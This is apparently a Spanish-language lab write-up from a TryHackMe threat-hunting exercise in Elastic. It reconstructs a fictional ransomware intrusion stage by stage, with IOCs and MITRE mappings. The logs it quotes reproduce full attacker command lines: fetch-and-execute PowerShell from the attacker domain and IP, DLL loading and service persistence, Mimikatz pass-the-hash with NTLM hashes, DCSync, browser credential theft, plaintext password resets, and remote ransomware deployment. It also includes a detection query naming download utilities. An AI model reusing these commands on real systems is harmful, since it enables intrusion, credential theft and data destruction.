- --
- Tags: #treathhunting #elastic #tryhackme 
- ----
### Informe

La alerta llegó al SOC alrededor de las 16:00. Dos máquinas, totalmente cifradas. Notas de rescate donde antes estaban los archivos. El SIEM central se apagó minutos antes.

Por suerte, alguien había conseguido extraer registros de los dos anfitriones afectados—los de Perry y otro desarrollador—antes de que todo se descontrolara.

**26 de septiembre de 2023**—simplemente otro martes más en SwiftSpend Financial, una empresa pequeña pero ingeniosa donde todo el mundo siempre está lidiando con cinco plazos y demasiado café.

Perry, uno de los desarrolladores, tenía un plazo de sprint muy ajustado. Su manager le había enviado un archivo de .7z cifrado con un fragmento de código que _necesitaba ser terminado ayer_. Perry se dio cuenta rápidamente de que su estación de trabajo no tenía nada que pudiera descomprimir el archivo. Así que, fiel al más puro estilo de desarrollador con cafeína, buscó en Google lo primero que se le ocurrió, hizo clic en el resultado superior (¿quién se desplaza hacia abajo?) y descargó una herramienta para abrirlo.

Todo parecía estar bien. Hasta que dejó de serlo.

Un poco más de una hora después, la estación de trabajo de Perry empezó a comportarse de forma extraña. Al principio, fue lento. Luego las aplicaciones se bloquearon. Entonces todo—literalmente cada archivo—se volvió ilegible.

Tu misión como cazador de amenazas es excavar entre los troncos y reconstruir la cadena de ataques. ¿Qué ha pasado? ¿Cómo empezó? ¿Cómo se propagó? ¿Y qué daño causó?

### Hipótesis
Sospechamos que el atacante accedió al sistema de Perry a través de un archivo trojanizado que descargó de una web no confiable. Tras la ejecución inicial, el atacante puede haber establecido persistencia en el host para mantener el acceso. Además, planteamos la hipótesis de que el atacante extrajo credenciales del sistema de Perry utilizando herramientas conocidas como Mimikatz, que permitieron el movimiento lateral y el acceso no autorizado a otros sistemas de la red. Si esto se confirma, es probable que varias cuentas de usuario privilegiadas hayan sido comprometidas. Como etapa final en la cadena de ataques, el atacante cifraba los archivos de usuario en los sistemas comprometidos, causando interrupciones.

### Documentacion

SwiftSpend Finance es una firma dinámica de servicios financieros especializada en estrategias de inversión boutique y gestión de activos digitales. Al combinar la experiencia financiera tradicional con la innovación fintech moderna, SwiftSpend ofrece soluciones personalizadas a una amplia gama de clientes, desde inversores individuales hasta pequeñas instituciones.

Aunque modesta en tamaño, la empresa opera a gran velocidad. Los equipos multifuncionales prosperan gracias a la agilidad, la capacidad de ingenio y una sólida cultura de resolución de problemas que mantiene a SwiftSpend a la vanguardia de la evolución fintech.
#### Empleados
| Nombre         | Nombre de usuario | Función                      | Host (última sesión iniciada) | IP           |
| -------------- | ----------------- | ---------------------------- | ----------------------------- | ------------ |
| Anna Jones     | anna.jones        | Analista Financiero Senior   | WKSTN-02                      | 172.16.1.151 |
| Damian Hall    | damian.hall       | Administrador de Sistemas TI | WKSTN-01                      | 172.16.1.150 |
| James Cromwell | james.cromwell    | Ingeniero de Seguridad       | WKSTN-08                      | 172.16.1.157 |
| Perry Parsons  | perry.parsons     | Desarrollador de software    | WKSTN-03                      | 172.16.1.152 |
| Olivia Bennett | olivia.bennett    | Gerente de Operaciones       | WKSTN-04                      | 172.16.1.153 |
| Ethan Clarke   | Ethan.Clarke      | Desarrollador de backend     | WKSTN-10                      | 172.16.1.159 |
| Maya Singh     | Maya.Singh        | Analista Financiero Junior   | WKSTN-05                      | 172.16.1.154 |
| Leo Martinez   | leo.martínez      | Ingeniero DevOps             | WKSTN-15                      | 172.16.1.164 |
| Grace Turner   | grace.turner      | Asistente Ejecutivo          | WKSTN-06                      | 172.16.1.155 |
| Noah Edwards   | noah.edwards      | Gestor de Producto           | WKSTN-14                      | 172.16.1.163 |
| Sophia Walker  | sophia.walker     | Desarrollador de software    | WKSTN-13                      | 172.16.1.162 |
| Marcus Young   | Marcus.Young      | Analista de Datos            | WKSTN-09                      | 172.16.1.158 |
| Rachel Kim     | rachel.kim        | Oficial de Cumplimiento      | WKSTN-12                      | 172.16.1.161 |
| Daniel Foster  | daniel.foster     | Gestor de carteras           | WKSTN-07                      | 172.16.1.156 |
| Claire Chen    | claire.chen       | Analista de riesgos          | WKSTN-11                      | 172.16.1.160 |
### IOCs
#### Basado en red:
Dominio:
- 7zipp.org
Dirección IP:
- 206.189.34.218
#### Basado en el anfitrión:
Extensión de archivo:
- `*.777zzz`
- `*.msi`
- `*.ps1`
Nombres de archivo:
- 7zipp.exe
- 7zipp.dll
- mimikatz.exe
Hashes:
- 4b9213d22989474b467aa53080d9e295
- 29efd64dd3c7fe1e2b022b7ad73a1ba5
- 61c0810a23580cf492a6ba4f7654566108331e7a4134c968c2d6a05261b2d8a1
- FD713992F39338986E8573aff1232675323fDe827328159B29A31cc3CD515874

### Command Output

#### STAGE 1 LIST OF IOCs "INITIAL ACCESS" 
![Pasted image 20260513155433](../Fotos/Pasted%20image%2020260513155433.png)

![Pasted image 20260514133849](../Fotos/Pasted%20image%2020260514133849.png)
Time: `Sep 26, 2023 @ 14:22:07`
OriginalFileName: ab.exe 
CommandLine: "C:\Windows\Installer\MSI542E.tmp" 
CurrentDirectory: C:\Windows\system32\ 
User: NT AUTHORITY\SYSTEM

![Pasted image 20260514134129](../Fotos/Pasted%20image%2020260514134129.png)
Time: `Sep 26, 2023 @ 14:23:02.935`
OriginalFileName: PowerShell.EXE 
CommandLine: powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb) 
CurrentDirectory: C:\Windows\system32\ 
User: NT AUTHORITY\SYSTEM

ParentImage: C:\Windows\Installer\MSI542E.tmp 
ParentCommandLine: "C:\Windows\Installer\MSI542E.tmp" 
ParentUser: NT AUTHORITY\SYSTEM

IOCs: 206.189.34.218
Downloaded File: 7z2301-x64.msi

Perry accedió a un dominio typosquatting (7zipp.org) y descargó un instalador troyanizado. El archivo MSI (MSI542E.tmp) se ejecutó e inmediatamente inició PowerShell, que recuperó y ejecutó un script remoto desde 7zipp.org, estableciendo así el acceso inicial al host. Los registros indican que el instalador se inició justo antes de la descarga por parte de PowerShell, lo que concuerda con la ejecución del archivo descargado por parte del usuario.

MITRE
Tactic: Execution
Technique: T1204 (User Execution)

---
#### STAGE 2 LIST OF IOCs "EXECUTION"
![Pasted image 20260513154414](../Fotos/Pasted%20image%2020260513154414.png)
Time: `Sep 26, 2023 @ 14:23:07`
Process.command_line: `powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)`

Time: `Sep 26, 2023 @ 14:23:07`
This execution do
`iwr https://www.7-zip.org/a/7z2301-x64.exe -outfile C:\Windows\Temp\7zlegit.exe; C:\Windows\Temp\7zlegit.exe`

Dropped File: 7zlegit.exe

User: SYSTEM
Host: WKSTN-03

El atacante ejecutó comandos maliciosos de PowerShell descargados a través del instalador MSI infectado. Desde 7zipp.org, el script se ejecutó con privilegios de SYSTEM, descargando y ejecutando cargas útiles adicionales, incluyendo 7zlegit.exe (disfrazado de instalador legítimo) e Invoke-NanoDump.ps1 para el robo de credenciales. Esta cadena muestra que la ejecución se originó a partir de las cargas útiles maliciosas de PowerShell del MSI, lo que permitió una mayor preparación para el movimiento lateral.

MITRE
Tactic: Execution
Technique: T1059 (Command and Scripting Interpreter)

----
**Persistencia**
*Persistencia :* `sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe" start="auto" obj="LocalSystem";` (`start="auto"` se ejecutará automáticamente al iniciar Windows `obj="LocalSystem"` El servicio corre como `NT AUTHORITY\SYSTEM`)
*Descarga DLL Maliciosa:* `iwr http://206.189.34.218/a/7zipp.dll -outfile 'C:\Program Files\7-zip\7zipp.dll';`

---
#### STAGE 3 LIST OF IOCs "PERSISTENCE"
![Pasted image 20260513155102](../Fotos/Pasted%20image%2020260513155102.png)
Time: `Sep 26, 2023 @ 14:23:23.989`
Service Created: 7zService 
Files: 7zipp.exe, 7zipp.dll
Command to malicious download: iwr http://206.189.34.218/a/7zipp.dll -outfile 'C:\Program Files\7-zip\7zipp.dll'; rundll32 'C:\Program Files\7-zip\7zipp.dll',Start;
Command to create Service : sc.exe create 7zService binpath= "C:\Program Files\7-zip\7zipp.exe" start="auto" obj="LocalSystem";

User: SYSTEM
Host: WKSTN-03

MITRE
Tactic: Persistence
Technique: T1547 (Boot or Logon Autostart Execution / Ejecución de inicio automático al arrancar o iniciar sesión)  - (**Create or Modify System Process: Windows Service**)

El atacante garantizó la persistencia creando un servicio malicioso de Windows llamado 7zService. Este servicio se configuró para ejecutar 7zipp.exe y cargar el archivo 7zipp.dll troyanizado a través de rundll32.exe, lo que garantizaba que el malware se ejecutara automáticamente con privilegios de SYSTEM.

---
#### STAGE 4 LIST OF IOCs "DEFENSE EVASION"
![Pasted image 20260513154730](../Fotos/Pasted%20image%2020260513154730.png)
Time: `Sep 26, 2023 @ 14:23:48`
Payload: 7zipp.dll
Command: rundll32 'C:\Program Files\7-zip\7zipp.dll',Start;
Use of : Rundll32.exe
IOCs: 206.189.34.218

User: SYSTEM
Host: WKSTN-03  

MITRE
Tactic: Defense Evasion
Technique: 1218 (System Binary Proxy Execution)

Tras crear el servicio 7zService para garantizar la persistencia, se ejecutó la carga útil. El atacante utilizó la utilidad legítima de Windows rundll32.exe para cargar y ejecutar código de su DLL maliciosa, 7zipp.dll. Esta técnica permite al atacante ejecutar su código malicioso en el contexto de un proceso de sistema de confianza, eludiendo los controles de seguridad básicos.

----
#### STAGE 5 LIST OF IOCs "CREDENTIAL ACCESS"
![Pasted image 20260513154232](../Fotos/Pasted%20image%2020260513154232.png)
Time: `Sep 26, 2023 @ 14:24:22.319`
CommandLine: `-C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -useb); Invoke-Nanodump;`
User: `NT AUTHORITY\SYSTEM`
Host: `WKSTN-03`
IOCs: pwrex.ps1, bash.evtx, 206.189.34.218

User: SYSTEM
Host: WKSTN-03

MITRE
Tactic: Credential Access
Technique: T1003 (OS Credential Dumping)

Una vez que su código malicioso estuvo en funcionamiento, el siguiente paso del atacante fue obtener credenciales. Ejecutaron Invoke-NanoDump.ps1, un script de PowerShell diseñado para volcar la memoria del proceso LSASS (lsass.exe) y robar contraseñas y hashes.

---
**Descarga de script de discovery**
![Pasted image 20260511084917](../Fotos/Pasted%20image%2020260511084917.png)
CommandLine: -C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/==SharpHound.ps1== -useb); Invoke-Bloodhound -c all

![Pasted image 20260511085115](../Fotos/Pasted%20image%2020260511085115.png)
CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/==PowerView.ps1== -useb); Get-Domain

*IEX ejecuta el script directamente en memoria*

User: SYSTEM
Host: WKSTN-03

----
#### STAGE 6 LIST OF IOCs "DISCOVERY"
![Pasted image 20260513153843](../Fotos/Pasted%20image%2020260513153843.png)
Time: `Sep 26, 2023 @ 14:26:46.047`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iex(iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -useb); Invoke-Bloodhound -c all 
CurrentDirectory: C:\Windows\Temp\ 
User: NT AUTHORITY\SYSTEM
Host: WKSTN-03

![Pasted image 20260513154006](../Fotos/Pasted%20image%2020260513154006.png)
Time: `Sep 26, 2023 @ 14:31:52.072`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-Domain 
CurrentDirectory: C:\Windows\Temp\m\x64\ 
User: NT AUTHORITY\SYSTEM
Host: WKSTN-03

User: SYSTEM
Host: WKSTN-03

MITRE
Tactic: Discovery
Technique: T1087 (Account Discovery)

Tras obtener las credenciales iniciales, el atacante comenzó un reconocimiento activo del entorno de Active Directory. Utilizó PowerShell para descargar y ejecutar SharpHound.ps1 (Invoke-Bloodhound) y PowerView.ps1. Estas acciones le permitieron mapear usuarios, grupos y relaciones de confianza del dominio para identificar objetivos de alto valor y planificar su siguiente movimiento.

----
#### STAGE 7 LIST OF IOCs "CREDENTIAL ACCESS"
![Pasted image 20260513154048](../Fotos/Pasted%20image%2020260513154048.png)
Time: `Sep 26, 2023 @ 14:28:53.575`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iwr https://github.com/gentilkiwi/==mimikatz==/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile m.zip 
CurrentDirectory: C:\Windows\Temp\ 
User: NT AUTHORITY\SYSTEM
Host: WKSTN-03

MITRE
Tactic: Command and Control
Technique : T1105 (Ingress Tool Transfer)

Para prepararse para un robo de credenciales avanzado, el atacante descargó el paquete Mimikatz. A las 14:28:53, utilizó PowerShell para descargar mimikatz_trunk.zip (guardado como m.zip) desde su repositorio oficial de GitHub, preparando así la herramienta para un ataque Pass-the-Hash.


---
#### STAGE 8 LIST OF IOCs "LATERAL MOVEMENT"
Leer tickets Kerberos / post-exploitation / LATERAL MOVEMENT
Revisar uso de binarios legítimos para descarga de archivos maliciosos en usuario especifico
```bash
perry.parsons and process.command_line : (
  "*Invoke-WebRequest*" or
  "*iwr*" or
  "*curl*" or
  "*wget*" or
  "*bitsadmin*" or
  "*certutil*"
)
```
![Pasted image 20260510104044](../Fotos/Pasted%20image%2020260510104044.png)
![Pasted image 20260510104642](../Fotos/Pasted%20image%2020260510104642.png)
*Descarga un script PowerShell desde internet y lo ejecuta directamente en memoria.*
*Invoke-PowerExtract no es estandar de Windows* (Posible herramienta ofensiva)
*iex(iwr ...)* (Ejecucion fileless)
*WKSTN-03$ Esto indica interacción con autenticación de dominio.*
*El script probablemente está:
1. leyendo tickets Kerberos
2. enumerando sesiones
3. agrupando credenciales
4. extrayendo hashes/tokens
*Muy probablemente:*
- Kerberoasting
- extracción de tickets
- credential dumping
- movimiento lateral
- reconocimiento AD

![Pasted image 20260510110203](../Fotos/Pasted%20image%2020260510110203.png)

|Usuario|Hash NTLM|
|---|---|
|james.cromwell|B852A0B8BD4E00564128E0A5EA2BC4CF|
|WKSTN-03$|E6A55FED2E27F712E8050E2DAE7A153C|
|perry.parsons|F49E13C828190059E9EF31D7729CE568
*Un atacante puede:*
- hacer Pass-the-Hash,
- cracking offline,
- movimiento lateral,
- autenticación remota.

|Actividad|Técnica|
|---|---|
|Descarga remota|T1105|
|PowerShell|T1059.001|
|Obfuscation|T1027|
|Credential Dumping|T1003|
|LSASS Memory|T1003.001|
|Kerberos artifacts|T1558 / T1003 related
**Datos**
time: `Sep 26, 2023 @ 14:25:18.945` (First execution pwrex.ps1)
time: `Sep 26, 2023 @ 14:26:13.928` (Results post execution pwrex.ps1)
agent.hostname: `WKSTN-03`
process.command_line: `C iex(iwr http://206.189.34.218/a/pwrex.ps1 -useb); Invoke-PowerExtract -PathToDMP C:\windows\temp\trash.evtx;`

----
![Pasted image 20260512112945](../Fotos/Pasted%20image%2020260512112945.png)
Pass The Hash
Time: `Sep 26, 2023 @ 14:29:43`
OriginalFileName: mimikatz.exe 
CommandLine: .\mimikatz.exe 'sekurlsa::pth /user:james.cromwell /domain:swiftspendfinancial.thm /ntlm:B852A0B8BD4E00564128E0A5EA2BC4CF /run:powershell.exe' 'exit' 
CurrentDirectory: C:\Windows\Temp\m\x64\ 
User: system
Host: WKSTN-03

Como system se interactua mendiate comando como objetivo a james.cromwell

User: James.cromwell
Host: WKSTN-03

MITRE
Tactic: Lateral Movement
Technique: T1550 (Use Alternate Authentication Material)

Aprovechando la herramienta Mimikatz descargada, el atacante realizó un ataque Pass-the-Hash utilizando sekurlsa::pth. Esto le permitió suplantar la identidad de un usuario con un hash NTLM robado y usar esa sesión para ejecutar su primer comando remoto (whoami) mediante Invoke-Command, con el fin de validar su capacidad de movimiento lateral.

----
#### STAGE 9 LIST OF IOCs "ACCOUNT MANIPULATION" 
![Pasted image 20260512115052](../Fotos/Pasted%20image%2020260512115052.png)
`Sep 26, 2023 @ 14:32:37.299`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Set-DomainUserPassword -Identity anna.jones -AccountPassword (ConvertTo-SecureString 'pwn3dpw!!!' -AsPlaintext -Force) -Domain swiftspendfinancial.thm -Verbose 
CurrentDirectory: C:\Windows\Temp\m\x64\ User: NT AUTHORITY\SYSTEM
User: anna.jones
Host: WKSTN-02

Para crear una base de acceso persistente utilizando credenciales legítimas, el atacante manipuló la cuenta 'anna.jones'. A las 14:32:37. Se cambia la contrasena de anna.jones al estar en un contexto de User SYSTEM.

MITRE
Tactic: Account Manipulation
Technique: T1099 (Additional Local or Domain Groups)

---
#### STAGE 10 LIST OF IOCs "LATERAL MOVEMENT"
`26 de mayo de 2023, 14:54:45`
Now in possession of a valid account, the attacker moved laterally to the second victim, WKSTN-02. Using Invoke-Command with anna.jones's new credentials...
UserL anna.jones
Password: 'pwn3dpw!!!
IOCs: 7zip.dll, 7zip2.dll, powershell.exe / www.7zipp.org


MITRE
Tactic: lateral movement
Technique: T1021 (remote services)

---
#### STAGE 11 LIST OF IOCs "CREDENTIAL ACCESS" 
![Pasted image 20260512123112](../Fotos/Pasted%20image%2020260512123112.png)
Time: `Sep 26, 2023 @ 15:08:24.764`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1 -useb); Invoke-SharpChromium -Command 'all' 
CurrentDirectory: C:\Users\anna.jones\ 
User: SSF\anna.jones
Host: WKSTN-02
IOCs: SharpChrome.exe, chrome.exe, certutil

Tras obtener acceso a WKSTN-02, el atacante continuó robando credenciales. Descargó y ejecutó "Invoke-SharpChromium" para sustraer contraseñas, cookies y otros datos guardados en los navegadores web del usuario.

User: anna.jones
Host: WKSTN-02

MITRE
Tactic: Credential Access
Technique: T1550 (Credential From Password Stores)

---
#### STAGE 12 LIST OF IOCs "Discovery"
![Pasted image 20260512132608](../Fotos/Pasted%20image%2020260512132608.png)
Time: `Sep 26, 2023 @ 15:14:06`
Command: C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'AD Recovery'

User: anna.jones
Host: WKSTN-02

MITRE
Tactic: Discovery
Technique: 1087 (Account Discovery)

Tras obtener las credenciales del navegador, el atacante realizó un reconocimiento más exhaustivo para encontrar una ruta de escalada de privilegios. Utilizando PowerView, primero listó los grupos de dominio y luego enumeró específicamente los miembros del grupo "AD RECOVERY"

---
#### STAGE 13 LIST OF IOCs "PRIVILEGE ESCALATION" 
![Pasted image 20260512135326](../Fotos/Pasted%20image%2020260512135326.png)
Time: `Sep 26, 2023 @ 15:15:34`
CommandLine: -C $username='SSF\==itadmin'; $password='NoO6@39Sk0!'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $new_creds = New-Object System.Management.Automation.PSCredential $username, $securePassword; iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Add-DomainGroupMember -Identity 'AD Recovery -Members anna.jones -Credential $new_creds -Verbose

User: itadmin
Host: WKSTN-02

MITRE
Tactic: Privilege Escalation
Technique: account munipulation

Resumen: Inmediatamente después de identificar el grupo 'AD Recovery', el atacante utilizó una cuenta de administrador comprometida, 'itadmin'. A las 15:15:34, ejecutó el comando 'Add-DomainGroupMember' para agregar a su usuario actual, 'anna.jones', a este grupo con altos privilegios.

---
#### STAGE 14 LIST OF IOCs "DISCOVERY" 
![Pasted image 20260512140526](../Fotos/Pasted%20image%2020260512140526.png)
Time: `Sep 26, 2023 @ 15:17:02`
Host Application = -C iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -useb); Get-DomainGroupMember -Identity 'Domain Admins'
IOCs: Domain Administrators

User: anna.jones
Host: WKSTN-02

MITRE
Tactic: Discovery
Technique: T1087 (Account Discovery)

Tras elevar sus privilegios, el atacante realizó un reconocimiento final para localizar a su objetivo. Utilizando PowerView, enumeró los miembros del grupo "Administradores de dominio", lo que le permitió identificar la valiosa cuenta "damian.hall".

---
#### STAGE 15 LIST OF IOCs "CREDENTIAL ACCESS"
![Pasted image 20260513141946](../Fotos/Pasted%20image%2020260513141946.png)
Time: `Sep 26, 2023 @ 15:17:19.525`
OriginalFileName: PowerShell.EXE 
CommandLine: -C iex(iwr https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpKatz.ps1 -useb); Invoke-Sharpkatz -Command --Command dcsync --Domain swiftspendfinancial.thm --DomainController DC-01.swiftspendfinancial.thm --User damian.hall 
CurrentDirectory: C:\Users\anna.jones\Downloads\ 
User: SSF\anna.jones

User: damian.hall
Host: WKSTN-02

MITRE
Tactic: Credential Access
Technique: T1003 (OS Credential Dumping)

Una vez identificado el objetivo, el atacante utilizó 'Invoke-SharpKatz' para realizar un ataque DCSync. Esto le permitió suplantar la identidad de un controlador de dominio y obtener el hash de la contraseña NTLM de la cuenta 'damian.hall' del controlador de dominio DC-01.

---
#### STAGE 16 LIST OF IOCs "DISCOVERY" AQUI SOLO ES TA BIEN EL USUARIO DAMIAN.HALL Y EL ACTIVO WKSTN-02
![Pasted image 20260513151306](../Fotos/Pasted%20image%2020260513151306.png)
Time: `Sep 26, 2023 @ 15:39:24.015`
OriginalFileName: PowerShell.EXE 
CommandLine: -C Invoke-Command -ScriptBlock {dir== C:\Users} -ComputerName WKSTN-03.swiftspendfinancial.thm C
urrentDirectory: C:\Users\anna.jones\Downloads\m\x64\ 
User: SSF\anna.jones

![Pasted image 20260513145915](../Fotos/Pasted%20image%2020260513145915.png)
Time: `Sep 26, 2023 @ 15:39:59.182`
OriginalFileName: PowerShell.EXE 
CommandLine: -C Invoke-Command -ScriptBlock {dir C:\Users\perry.parsons\Documents} -ComputerName WKSTN-03.swiftspendfinancial.thm 
CurrentDirectory: C:\Users\anna.jones\Downloads\m\x64\ 
User: SSF\anna.jones

IOCs: mimikatz.exe, sekurlsa::p

User: damian.hall
Host: WKSTN-02

MITRE
Tactic: Discovery
Technique: T1087 (Account Discovery)

Resumen: Tras obtener las credenciales de 'damian.hall', el atacante realizó un reconocimiento en la primera máquina víctima, WKSTN-03. Utilizando Invoke-Command, listó de forma remota directorios como 'C:\Users' y 'C:\Users\perry.parsons\Documents' para identificar archivos valiosos que cifrar.

---
#### STAGE 17 LIST OF IOCs "COMMAND AND CONTROL" BUENA 
![Pasted image 20260510113002](../Fotos/Pasted%20image%2020260510113002.png)
*Invoque-Command Permite ejecutar comandos remotamente en otro host.*
*Descarga un ejecutable sospechoso. 777bomb.exe*
*La actividad fue iniciada bajo la cuenta `anna.jones`.*

Time: `2023-09-26 15:41:29.236`
Agent.name: `WKSTN-03`
User.name: anna.jones
Image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
URL: `http://www.7zipp.org/a/777bomb.exe`
CommandLine: `-C Invoke-Command -ScriptBlock {iwr http://www.7zipp.org/a/777bomb.exe -outfile C:\Users\perry.parsons\bomb.exe; ; dir C:\Users\perry.parsons} -ComputerName WKSTN-03.swiftspendfinancial.thm` 
CurrentDirectory: `C:\Users\anna.jones\Downloads\m\x64\`
Malware Downloaded: `C:\Users\perry.parsons\bomb.exe` (Payload almacenado en perfil de usuario perry.parsons.)

User: anna.jones
Host: WKSTN-03

MITRE
Tactic: Command and Control
Technique: T1105 (ingress tool transfer)

Resumen: Tras identificar los directorios objetivo, el atacante descargó la carga útil final del ransomware. Mediante Invoke-Command, ordenó remotamente a WKSTN-03 que descargara '777bomb.exe' del servidor C2 (www.7zipp.org) y lo guardara como 'bomb.exe'.

-----
#### STAGE 18 LIFT OF IOCs "IMPACT" 
![Pasted image 20260514144031](../Fotos/Pasted%20image%2020260514144031.png)
![Pasted image 20260513152950](../Fotos/Pasted%20image%2020260513152950.png)
![Pasted image 20260513153408](../Fotos/Pasted%20image%2020260513153408.png)
![Pasted image 20260513153421](../Fotos/Pasted%20image%2020260513153421.png)
![Pasted image 20260513153429](../Fotos/Pasted%20image%2020260513153429.png)
Time: `Sep 26, 2023 @ 15:41:51.122`
OriginalFileName: PowerShell.EXE 
CommandLine: -C Invoke-Command -ScriptBlock {C:\Users\perry.parsons\bomb.exe} -ComputerName WKSTN-03.swiftspendfinancial.thm 
CurrentDirectory: C:\Users\anna.jones\Downloads\m\x64\ 
User: SSF\anna.jones

IOCs: 099e420231ba78045bcea3a3aff3d9fa - 4cfbf83098fb137b0e68dad615586e372bd970e3cdb7e59f98219570b678a4d - 777zzz (extension)

User: damian.hall
Host: WKSTN-03

MITRE
Tactic: Impact
Technique: T1486 (Data encrypted for impact)

Resumen: Una vez descargada la carga útil, el atacante ejecutó 'bomb.exe' en WKSTN-03. Los registros de Sysmon confirman que el proceso se ejecutó bajo el contexto de usuario 'damian.hall' a las 15:41:51, comenzando así el cifrado del archivo.

----
**Encrypted Files**
```bash
file.extension : "777zzz"
```

| Fecha y Hora                | Ruta del Archivo                                                                            |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| Sep 26, 2023 @ 15:43:50.529 | `C:\Users\perry.parsons\Downloads\7z2301-x64.msi.777zzz`                                    |
| Sep 26, 2023 @ 15:43:50.534 | `C:\Users\perry.parsons\Downloads\Utilities\utility_app.exe.777zzz`                         |
| Sep 26, 2023 @ 15:43:50.535 | `C:\Users\perry.parsons\Downloads\Utilities\utility_batch.bat.777zzz`                       |
| Sep 26, 2023 @ 15:43:50.535 | `C:\Users\perry.parsons\Downloads\Utilities\utility_script.ps1.777zzz`                      |
| Sep 26, 2023 @ 15:43:50.536 | `C:\Users\perry.parsons\Downloads\Utilities\utility_script.sh.777zzz`                       |
| Sep 26, 2023 @ 15:43:50.537 | `C:\Users\perry.parsons\Downloads\Software\app_installer.exe.777zzz`                        |
| Sep 26, 2023 @ 15:43:50.538 | `C:\Users\perry.parsons\Downloads\Software\framework_setup.msi.777zzz`                      |
| Sep 26, 2023 @ 15:43:50.538 | `C:\Users\perry.parsons\Downloads\Software\library_package.zip.777zzz`                      |
| Sep 26, 2023 @ 15:43:50.540 | `C:\Users\perry.parsons\Downloads\Software\toolkit_installer.exe.777zzz`                    |
| Sep 26, 2023 @ 15:43:50.540 | `C:\Users\perry.parsons\Downloads\Libraries\library1.dll.777zzz`                            |
| Sep 26, 2023 @ 15:43:50.542 | `C:\Users\perry.parsons\Downloads\Libraries\library2.so.777zzz`                             |
| Sep 26, 2023 @ 15:43:50.543 | `C:\Users\perry.parsons\Downloads\Frameworks\framework1.zip.777zzz`                         |
| Sep 26, 2023 @ 15:43:50.544 | `C:\Users\perry.parsons\Downloads\Frameworks\framework2.tar.gz.777zzz`                      |
| Sep 26, 2023 @ 15:43:50.545 | `C:\Users\perry.parsons\Downloads\Documentation\api_reference.docx.777zzz`                  |
| Sep 26, 2023 @ 15:43:50.546 | `C:\Users\perry.parsons\Downloads\Documentation\developer_guide.pdf.777zzz`                 |
| Sep 26, 2023 @ 15:43:50.547 | `C:\Users\perry.parsons\Downloads\Documentation\user_manual.pdf.777zzz`                     |
| Sep 26, 2023 @ 15:45:07.729 | `C:\Users\anna.jones\Downloads\20230926152643_BloodHound.zip.777zzz`                        |
| Sep 26, 2023 @ 15:45:07.745 | `C:\Users\anna.jones\Downloads\7zip.dll.777zzz`                                             |
| Sep 26, 2023 @ 15:45:07.745 | `C:\Users\anna.jones\Downloads\7zip2.dll.777zzz`                                            |
| Sep 26, 2023 @ 15:45:07.807 | `C:\Users\anna.jones\Downloads\chrome.exe.777zzz`                                           |
| Sep 26, 2023 @ 15:45:07.891 | `C:\Users\anna.jones\Downloads\m.zip.777zzz`                                                |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\OWU3YTlhYTAtNTRjMi00ZWUzLWE2YWItNzE1MGQyNjJlZTQ5.bin.777zzz` |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\Log_Analyzer_Tool.exe.777zzz`                      |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\Remote_Desktop_Tool.exe.777zzz`                    |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\utility_app.exe.777zzz`                            |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\utility_batch.bat.777zzz`                          |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\utility_script.ps1.777zzz`                         |
| Sep 26, 2023 @ 15:45:07.907 | `C:\Users\anna.jones\Downloads\Utilities\utility_script.sh.777zzz`                          |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\Software_Installers\Antivirus_Setup.exe.777zzz`              |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\Software_Installers\Server_Updates.msi.777zzz`               |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\Security_Tools\Password_Cracker_Tool.exe.777zzz`             |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\Security_Tools\Vulnerability_Scanner.exe.777zzz`             |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\m\kiwi_passwords.yar.777zzz`                                 |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\m\mimicom.idl.777zzz`                                        |
| Sep 26, 2023 @ 15:45:07.929 | `C:\Users\anna.jones\Downloads\m\README.md.777zzz`                                          |
| Sep 26, 2023 @ 15:45:07.944 | `C:\Users\anna.jones\Downloads\m\x64\mimidrv.sys.777zzz`                                    |
